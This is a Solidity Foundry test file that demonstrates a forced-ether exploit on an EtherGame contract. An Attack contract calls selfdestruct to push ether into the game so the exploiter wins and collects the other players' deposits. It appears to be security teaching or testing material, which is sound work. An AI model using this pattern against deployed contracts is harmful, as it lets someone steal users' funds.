// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "../src/EtherGame.sol";

contract Attack {
    EtherGame etherGame;

    constructor(EtherGame _etherGame) {
        etherGame = EtherGame(_etherGame);
    }

    function attack() public payable {
        // You can simply break the game by sending ether so that
        // the game balance >= 7 ether

        // cast address to payable
        address payable addr = payable(address(etherGame));
        selfdestruct(addr);
    }
}

contract EtherGameTest is Test {
    uint256 public privateKey = 1234;
    address public signer;
    EtherGame public etherGame;
    address public alice = vm.addr(1111);
    address public bob = vm.addr(2222);
    address public exploiter = vm.addr(3333);
    function setUp() public {
        signer = vm.addr(privateKey);
        vm.startPrank(signer);
        etherGame = new EtherGame();
        vm.stopPrank();
        vm.deal(alice, 1 ether);
        vm.deal(bob, 1 ether);
        vm.deal(exploiter, 5 ether);
        vm.startPrank(alice);
        etherGame.deposit{value: 1 ether}();
        vm.stopPrank();
        vm.startPrank(bob);
        etherGame.deposit{value: 1 ether}();
        vm.stopPrank();
    }

    function test_bug_basic() public {
        vm.startPrank(exploiter);
        vm.expectRevert(bytes(""));
        payable(address(etherGame)).transfer(4 ether); // fail because contract not have payable on fallback or receive

//        etherGame.deposit{value: 1 ether}();
//        assertEq(exploiter.balance, 0 ether);
//        assertEq(address(etherGame).balance, 7 ether);
//        etherGame.claimReward();
//        assertEq(etherGame.winner(), exploiter);
    }

    function test_bug_with_attacker() public {
        vm.startPrank(exploiter);
        Attack attack = new Attack(etherGame);
        attack.attack{value: 4 ether}();
        etherGame.deposit{value: 1 ether}();
        assertEq(address(etherGame).balance, 7 ether);
        assertEq(etherGame.winner(), exploiter);
        etherGame.claimReward();
        vm.stopPrank();
        assertEq(exploiter.balance, 7 ether);
    }
}